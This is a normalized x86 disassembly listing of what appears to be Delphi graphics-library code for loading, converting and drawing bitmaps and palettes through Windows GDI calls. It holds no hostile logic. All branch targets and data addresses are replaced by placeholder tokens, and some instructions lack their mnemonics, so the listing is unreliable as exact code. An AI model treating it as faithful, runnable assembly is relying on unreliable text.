call sub_4248b4
push eax
call SetStretchBltMode
mov eax ebx
call sub_427574
mov dl [ r-xdata ]
call sub_424988
mov eax ebx
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
mov eax ebx
call sub_4277d4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20 ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ esi + 0x1c ]
push eax
push 0x0
push 0x0
mov eax ebx
call sub_427574
mov eax [ eax + 0x4 ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call StretchBlt
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4274e7
cmp [ ebp - 0x9 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427475
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0xc ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
mov [ ebp - 0x1c ] eax
mov eax [ edi + 0x8 ]
sub eax [ edi ]
push eax
mov eax [ edi + 0xc ]
sub eax [ edi + 0x4 ]
push eax
mov eax ebx
call sub_427574
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ esi + 0x1c ]
push eax
mov eax [ esi + 0x20 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_424e44
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call SelectObject
retn
mov eax [ ebp - 0x18 ]
push eax
call DeleteDC
sub_4274f4
push ebx
push esi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x4 ] 0x1
jle r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax esi
call sub_427734
cmp [ ebx + 0x71 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
xor eax eax
jmp r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
lea edx [ ebx + 0x18 ]
push edx
mov ecx eax
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_427140
pop esi
pop ebx
retn
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x2c ] eax
push esi
call DeleteObject
test eax eax
jne r-xdata
call sub_424bf8
sub_427574
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x2c ]
pop esi
pop ebx
retn
mov eax ebx
call sub_427734
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_426310
mov esi eax
mov [ ebx + 0x2c ] esi
mov [ esi + 0x2c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x10 ]
mov [ esi + 0x28 ] eax
mov [ esi + 0x34 ] ebx
mov [ esi + 0x30 ] sub_427200
sub_4275bc
push ebx
mov ebx eax
mov eax ebx
call sub_427724
mov eax ebx
call sub_427734
mov edx ebx
mov eax ebx
call sub_427200
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x8 ]
pop ebx
retn
sub_4275e0
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x8 ]
test edx edx
je r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp edx [ eax + 0x14 ]
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov al 0x1
jmp r-xdata
retn
sub_427660
push ebx
mov ebx eax
mov eax [ ebx + 0x34 ]
cmp eax 0x20000000
jne r-xdata
call sub_4232e0
mov eax ebx
call sub_427630
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x20 ]
dec eax
push eax
mov eax ebx
call sub_427574
xor edx edx
pop ecx
call sub_424840
jmp r-xdata
mov eax 0xffffff
jmp r-xdata
or eax 0x2000000
pop ebx
retn
sub_4276b0
push ebx
push esi
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
call sub_427834
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea eax [ ebx + 0x18 ]
push eax
push 0x0
mov esi [ ebx + 0x10 ]
mov ecx esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_4266d8
mov [ ebx + 0x14 ] eax
lea eax [ ebx + 0x18 ]
push eax
push 0x54
mov eax [ ebx + 0x8 ]
push eax
call GetObjectA
lea eax [ ebx + 0x18 ]
mov edx eax
add eax 0x18
mov [ eax ] 0x28
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] 0x1
mov cx [ edx + 0x10 ]
imul cx [ edx + 0x12 ]
mov [ eax + 0xe ] cx
sub_427734
push ebp
mov ebp esp
add esp 0xfffffff0
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov esp ebp
pop ebp
retn
mov edx [ eax + 0x14 ]
mov [ eax + 0x8 ] edx
cmp [ eax + 0x6c ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ eax + 0x6c ]
call sub_41a880
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x10 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax + 0x14 ]
mov [ ebp - 0xc ] edx
xor eax eax
push ebp
push sub_4277b7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x10 ] edx
mov [ eax + 0x14 ] edx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
mov edx [ eax + 0x6c ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x10 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x14 ] edx
retn
sub_4277d4
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x32 ] 0x0
je r-xdata
mov esi [ ebx + 0x28 ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ebx + 0x31 ] 0x0
jne r-xdata
mov eax ebx
call sub_427724
mov eax ebx
call sub_427734
mov esi [ ebx + 0x28 ]
mov eax ebx
call sub_427660
mov ecx eax
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
call sub_426da0
mov [ esi + 0xc ] eax
mov [ ebx + 0x32 ] 0x1
mov [ ebx + 0x31 ] 0x1
call sub_426294
mov eax [ esi + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_427834
push ebx
push esi
push edi
push ebp
mov edi eax
mov ebp [ edi + 0x28 ]
cmp [ edi + 0x30 ] 0x0
jne r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov cx [ ebp + 0x3e ]
mov eax 0x1
shl eax cl
mov ecx eax
xor edx edx
mov eax [ ebp + 0x14 ]
call sub_425390
mov esi eax
mov [ ebp + 0x10 ] esi
test esi esi
jne r-xdata
call sub_426294
push 0x0
call GetDC
call sub_424ca0
mov esi eax
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
mov bl 0x1
push 0xc
push esi
call GetDeviceCaps
mov ebx eax
push 0xe
push esi
call GetDeviceCaps
imul ebx eax
movzx eax [ ebp + 0x2a ]
movzx edx [ ebp + 0x28 ]
imul edx
cmp ebx eax
jl r-xdata
push esi
push 0x0
call ReleaseDC
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
call CreateHalftonePalette
mov [ ebp + 0x10 ] eax
xor ebx ebx
jmp r-xdata
mov [ edi + 0x30 ] 0x1
mov [ ebp + 0x71 ] bl
test bl bl
je r-xdata
sub_4278ec
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
mov ebx ecx
mov esi eax
cmp dx 0x2
jne r-xdata
mov eax [ rw-data ]
call sub_424b74
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x54 ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx ebx
mov eax esi
call sub_427140
mov eax [ esi + 0x28 ]
mov [ eax + 0x70 ] 0x0
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov [ esi + 0x22 ] al
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
xor eax eax
mov [ ebp - 0x3c ] eax
mov eax esi
call sub_427724
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x54 ]
push eax
push 0x54
push ebx
call GetObjectA
cmp [ ebp - 0x40 ] 0x0
jne r-xdata
sub_427970
push ebx
push esi
mov ebx edx
mov esi eax
mov eax ebx
mov edx [ eax ]
call [ edx ]
push eax
mov eax ebx
call sub_41a860
pop ecx
sub ecx eax
mov edx ebx
mov eax esi
call sub_428024
pop esi
pop ebx
retn
sub_427994
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_427a1b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x8 ]
mov [ eax + 0x10 ] esi
mov eax [ ebp + 0x10 ]
mov edx [ ebp - 0x8 ]
mov esi eax
lea edi [ edx + 0x18 ]
mov ecx 0x15
[ edi ] [ esi ]
mov eax [ ebp - 0x8 ]
mov dl [ ebp + 0xc ]
mov [ eax + 0x70 ] dl
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x2c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ r-xdata ]
call sub_403440
mov edx [ ebp - 0x8 ]
mov [ edx + 0x6c ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ edx + 0x14 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_427a7b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x28 ]
call sub_426508
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov [ edx + 0x28 ] eax
call sub_426504
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427a82
push rw-data
call LeaveCriticalSection
retn
sub_427a94
push ebx
push esi
push edi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x4
mov eax esi
mov edi [ eax ]
call [ edi + 0xc ]
mov ecx [ esp ]
mov edx esi
mov eax ebx
call sub_428024
pop edx
pop edi
pop esi
pop ebx
retn
sub_427abc
push ebp
mov ebp esp
add esp 0xffffff54
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x30 ] eax
xor eax eax
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x38 ] eax
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp - 0x20 ] 0xc
sete [ ebp - 0x21 ]
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
add eax 0xc
add eax 0x400
call sub_4026cc
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
xor edx edx
push ebp
push sub_427fd9
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
push ebp
push sub_427fac
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov [ ebp - 0x20 ] 0x28
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub esi [ ebp - 0x20 ]
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
cmp eax 0x3
je r-xdata
lea edx [ ebp - 0x48 ]
add edx 0x4
mov ecx 0x8
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx [ ebp - 0x3c ]
mov eax ebx
xor ecx ecx
mov edx 0x28
call sub_402ca4
mov eax ebx
movzx edx [ ebp - 0x44 ]
mov [ eax + 0x4 ] edx
movzx edx [ ebp - 0x42 ]
mov [ eax + 0x8 ] edx
mov dx [ ebp - 0x40 ]
mov [ eax + 0xc ] dx
mov dx [ ebp - 0x3e ]
mov [ eax + 0xe ] dx
sub esi 0xc
jmp r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x20 ]
mov [ ebx ] eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] eax
cmp [ ebx + 0xc ] 0x1
je r-xdata
test eax eax
je r-xdata
cmp [ ebp - 0x20 ] 0x28
jne r-xdata
call sub_424b8c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebp - 0x38 ] eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
cmp ax 0x10
je r-xdata
mov edx [ ebp + 0x8 ]
mov ecx 0xe
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ecx [ ebp - 0x20 ]
sub ecx 0x4
mov edx [ ebp - 0x18 ]
add edx 0x4
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov eax esi
xor edx edx
push edx
push eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_41aafc
mov edx esi
neg edx
mov cx 0x2
mov eax [ ebp - 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov eax [ ebp - 0x38 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0xaa ]
xor ecx ecx
mov edx 0xe
call sub_402ca4
mov [ ebp - 0xaa ] 0x4d42
mov eax [ ebp - 0x20 ]
add eax esi
mov [ ebp - 0xa8 ] eax
lea eax [ ebp - 0xaa ]
mov [ ebp + 0x8 ] eax
mov ecx [ ebx + 0x20 ]
movzx edi [ ebp - 0x21 ]
xor eax eax
mov al [ edi + rw-data ]
imul ecx eax
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x8 ]
call sub_41aa8c
mov eax [ ebx + 0x20 ]
xor edx edx
mov dl [ edi + rw-data ]
imul edx
sub esi eax
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
mov ax [ ebx + 0xe ]
call sub_424e10
mov [ ebx + 0x20 ] eax
cmp [ ebx + 0x10 ] 0x3
jne r-xdata
cmp ax 0x20
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp esi eax
jbe r-xdata
movzx edx [ ebx + 0xe ]
mov eax [ ebx + 0x4 ]
mov ecx 0x20
call sub_424e30
mov ecx eax
mov eax [ ebx + 0x8 ]
cdq
xor eax edx
sub eax edx
imul ecx eax
mov [ ebx + 0x14 ] ecx
mov edx [ ebp - 0x1c ]
mov ecx 0xc
mov eax [ ebp - 0x8 ]
call sub_41aa8c
add [ ebp - 0x1c ] 0xc
sub esi 0xc
cmp [ ebp - 0x21 ] 0x0
je r-xdata
mov esi eax
push 0x0
call GetDC
call sub_424ca0
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_427f27
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
call sub_4250d8
cmp [ rw-data ] 0x0
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x0
push 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call CreateDIBSection
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax esi
call sub_4026cc
mov [ ebp - 0x14 ] eax
xor edx edx
push ebp
push sub_427e8f
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41aa8c
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleDC
call sub_424ca0
mov [ ebp - 0x10 ] eax
push 0x1
push 0x1
mov eax [ ebp - 0xc ]
push eax
call CreateCompatibleBitmap
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
test eax eax
jbe r-xdata
call GetLastError
test eax eax
jne r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_427e63
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x0
mov eax [ ebp - 0x18 ]
push eax
mov edx [ ebp - 0x14 ]
push edx
push 0x4
push eax
mov eax [ ebp - 0x10 ]
push eax
call CreateDIBitmap
mov [ ebp - 0x28 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov ecx eax
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425390
mov [ ebp - 0x30 ] eax
push 0x0
mov eax [ ebp - 0x30 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x10 ]
push eax
call RealizePalette
call sub_40cb14
call sub_424b8c
jmp r-xdata
xor eax eax
push ebp
push sub_427ef6
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x14 ]
mov ecx esi
mov eax [ ebp - 0x8 ]
call sub_41aa8c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427e6a
cmp [ ebp - 0x34 ] 0x0
je r-xdata
call GetLastError
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f2e
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectObject
push eax
call DeleteObject
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x10 ]
push eax
call SelectPalette
call sub_40cb14
call sub_424b8c
jmp r-xdata
sub_427e6a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
push eax
call DeleteDC
sub_427f2e
mov eax [ ebp - 0x3c ]
cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_427fc3
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_425390
mov [ ebp - 0x30 ] eax
sub_427fe0
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_427994
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_428024
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_427724
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41aa8c
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_427994
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_427abc
call sub_424b8c
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_428094
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_427724
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402ca4
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_426d3c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_42812f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_427994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428158
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_4275e0
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_427724
mov eax esi
call sub_427834
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_427724
mov eax esi
call sub_427834
mov eax esi
call sub_4276b0
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_426d3c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_427140
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427994
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_427994
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_4266d8
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428290
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_427734
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_427140
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_4282e4
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_427734
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_427140
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_428364
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_427724
mov eax ebx
call sub_427734
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_4266d8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4283fb
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_427994
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
